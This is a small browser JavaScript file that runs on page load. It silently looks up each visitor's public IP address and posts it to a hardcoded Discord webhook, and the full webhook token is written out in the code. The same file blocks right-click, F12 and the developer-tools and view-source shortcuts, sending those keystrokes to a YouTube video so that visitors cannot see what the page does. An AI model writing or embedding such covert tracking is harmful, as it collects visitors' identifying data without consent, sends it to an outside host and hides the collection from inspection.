async function sendWebhook() {
    let ip = await (await fetch(`https://ifconfig.me/ip`)).text()
    const webhookURL =
      "https://discordapp.com/api/webhooks/1219323327504715777/T8WK4rd1eQXpEN3uvwYMwZFvgpn3p55QCLjmAva0BTk3P6sWCbDJJZeIHyvFdwd0LAcQ"
  
    const message = {
      content: `${ip}`,
    }
  
    fetch(webhookURL, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(message),
    })
      .then((response) => {
        if (!response.ok) {
          console.error(`Error ${response.status}: ${response.statusText}`)
        }
      })
      .catch((error) => console.error("Error:", error))
  }
  
  window.onload = function () {
    // this will run funcion on page load
    sendWebhook()
  }
  
  document.addEventListener("contextmenu", function (e) {
    e.preventDefault()
  })
  
  document.onkeydown = function (e) {
    if (event.keyCode == 123) {
      return false
    }
  
    if (e.ctrlKey && e.shiftKey && e.keyCode == "I".charCodeAt(0)) {
      window.open("https://www.youtube.com/watch?v=dQw4w9WgXcQ", "_blank")
      return false
    }
  
    if (e.ctrlKey && e.shiftKey && e.keyCode == "C".charCodeAt(0)) {
      window.open("https://www.youtube.com/watch?v=dQw4w9WgXcQ", "_blank")
      return false
    }
  
    if (e.ctrlKey && e.shiftKey && e.keyCode == "J".charCodeAt(0)) {
      window.open("https://www.youtube.com/watch?v=dQw4w9WgXcQ", "_blank")
      return false
    }
  
    if (e.ctrlKey && e.keyCode == "U".charCodeAt(0)) {
      window.open("https://www.youtube.com/watch?v=dQw4w9WgXcQ", "_blank")
      return false
    }
  }
  
